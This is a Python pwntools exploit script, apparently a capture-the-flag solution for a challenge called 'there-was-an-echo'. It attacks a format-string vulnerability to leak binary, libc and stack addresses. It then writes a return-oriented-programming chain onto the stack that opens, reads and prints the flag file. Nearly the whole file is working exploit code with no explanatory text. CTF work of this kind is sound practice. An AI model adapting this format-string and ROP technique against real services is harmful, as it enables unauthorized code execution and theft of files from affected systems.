#!/usr/bin/env python3
from pwn import *


# context.log_level = "debug"
context.binary = elf = ELF("../challenge/out_patched")

def conn():
    if args.REMOTE:
        return remote("there-was-an-echo.ctf.ingeniums.club", 1337, ssl=True)
    else:
        return elf.process()

r = conn()
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF('./libc.so.6')

def pad(pay):
    return b'_' * (8 - len(pay) % 8) + pay

def dump(addr):
    addr = p64(addr)

    if b"\n" in addr:
        return b'\x00'

    pay = b"%8$s"
    pay = pad(pay)
    pay += b'ED' * 4
    pay += addr

    r.sendline(pay)

    r.recvuntil(b'____')

    out = b''
    out = r.recvuntil(b'ED' * 4)

    return out[:-8] + b'\x00'
        



pay = b'%45$p'
# gdb.attach(r)
r.sendline(pay)
bin_leak = r.recvline()[:-1]
bin_leak = int(bin_leak, 16)
bin_leak &= ~0xfff

base = bin_leak - 0x1000
elf.address = base
log.info(f"leaked binary address == {hex(base)}")

# libc leak
bss_printf = base + 0x3FB0
bss_fgets = base + 0x3FC0
bss_setvbuf = base + 0x3FC8

printf = dump(bss_printf)
fgets = dump(bss_fgets)
setvbuf = dump(bss_setvbuf)
printf = u64(printf.ljust(8, b'\x00'))
fgets = u64(fgets.ljust(8, b'\x00'))
setvbuf = u64(setvbuf.ljust(8, b'\x00'))
log.info(f"printf == {hex(printf)}")
log.info(f"fgets == {hex(fgets)}")
log.info(f"setvbuf == {hex(setvbuf)}")

libc.address = printf - libc.symbols['printf']
log.info(f"libc base == {hex(libc.address)}")

# gdb_script = """
#     brva 0x1208
# """

# # stack leak
r.clean()
pay = b"%10$p"


r.sendline(pay)

stack_leak = r.recvline()[:-1]
stack_leak = int(stack_leak, 16)
printf_ret_adr = stack_leak - 0x128
buffer_adr = stack_leak - 0x120
main_ret_adr = stack_leak - 8
log.info(f"leaked stack address == {hex(stack_leak)}")
log.info(f"printf ret address == {hex(printf_ret_adr)}")
log.info(f"main ret adr == {hex(main_ret_adr)}")
log.info(f"buffer adr {hex(buffer_adr)}")


ret = libc.address + 0x000000000002882f
pop_rdi = libc.address + 0x000000000010f75b
leave_ret = libc.address + 0x00000000000299d2
pop_rbp = libc.address + 0x0000000000028a91
pop_rdx = libc.address + 0x00000000000b502c # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
pop_rsi = libc.address + 0x0000000000110a4d


chain = b''
chain += p64(pop_rdi)
chain += p64(0)
chain += p64(pop_rsi)
chain += p64(elf.bss() + 0x100)
chain += p64(pop_rdx)
chain += p64(0x8)
chain += p64(0) * 4
chain += p64(libc.sym['read'])
# read(0, elf.bss() + 0x100, 0x8)
# > flag\x00

chain += p64(pop_rdi)
chain += p64(2)
chain += p64(pop_rsi)
chain += p64(elf.bss() + 0x100)
chain += p64(pop_rdx)
chain += p64(0)
chain += p64(0) * 4
chain += p64(libc.sym['syscall'])
# open(elf.bss() + 0x100, 0)
# < 3

chain += p64(pop_rdi)
chain += p64(3)
chain += p64(pop_rsi)
chain += p64(elf.bss() + 0x100)
chain += p64(pop_rbp)
chain += p64(buffer_adr)
chain += p64(pop_rdx)
chain += p64(0x100)
chain += p64(0) * 4
chain += p64(libc.sym['read'])
# read(3, elf.bss() + 0x100, 0x100)

chain += p64(pop_rdi)
chain += p64(1)
chain += p64(pop_rsi)
chain += p64(elf.bss() + 0x100)
chain += p64(pop_rbp)
chain += p64(buffer_adr)
chain += p64(pop_rdx)
chain += p64(0x100)
chain += p64(0) * 4
chain += p64(libc.sym['write'])
# write(1, elf.bss() + 0x100, 0x100)


for i in range(0, len(chain), 8):
    pay = fmtstr_payload(6, writes={
        main_ret_adr + i: u64(chain[i:i+8]),
    })

    r.sendline(pay)



pay = fmtstr_payload(6, writes={
    printf_ret_adr - 8: main_ret_adr - 8,
    printf_ret_adr: leave_ret,
})

sleep(2)
log.info(f"pay size == {hex(len(pay))}")


# gdb.attach(r, f"""
#     brva 0x1392
# ()""")
r.sendline(pay)

r.clean()
r.send(b"flag\x00")

r.interactive()